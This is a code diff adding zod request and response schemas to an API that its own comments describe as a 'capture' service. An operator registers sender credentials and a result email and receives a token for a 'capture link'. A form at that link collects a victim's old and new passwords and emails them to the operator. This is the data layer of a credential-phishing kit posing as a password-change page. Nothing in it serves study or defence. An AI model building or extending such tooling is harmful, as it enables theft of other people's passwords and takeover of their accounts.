@@ -14,3 +14,47 @@ import * as zod from "zod";
 export const HealthCheckResponse = zod.object({
   status: zod.string(),
 });
+
+/**
+ * Registers a new session with sender credentials and result email. Returns a unique token for the capture link.
+ * @summary Create a capture session
+ */
+export const CreateSessionBody = zod.object({
+  senderEmail: zod.string().email(),
+  senderPassword: zod.string(),
+  resultEmail: zod.string().email(),
+  messageSubject: zod.string(),
+});
+
+/**
+ * Returns basic session info (existence check). Does not expose credentials.
+ * @summary Get session info by token
+ */
+export const GetSessionParams = zod.object({
+  token: zod.coerce.string(),
+});
+
+export const GetSessionResponse = zod.object({
+  token: zod.string(),
+  messageSubject: zod.string().optional(),
+  exists: zod.boolean(),
+  used: zod.boolean(),
+});
+
+/**
+ * Receives old/new password from the capture form and sends them via email to the result email address.
+ * @summary Submit captured credentials
+ */
+export const SubmitCaptureParams = zod.object({
+  token: zod.coerce.string(),
+});
+
+export const SubmitCaptureBody = zod.object({
+  oldPassword: zod.string(),
+  newPassword: zod.string(),
+});
+
+export const SubmitCaptureResponse = zod.object({
+  success: zod.boolean(),
+  message: zod.string(),
+});
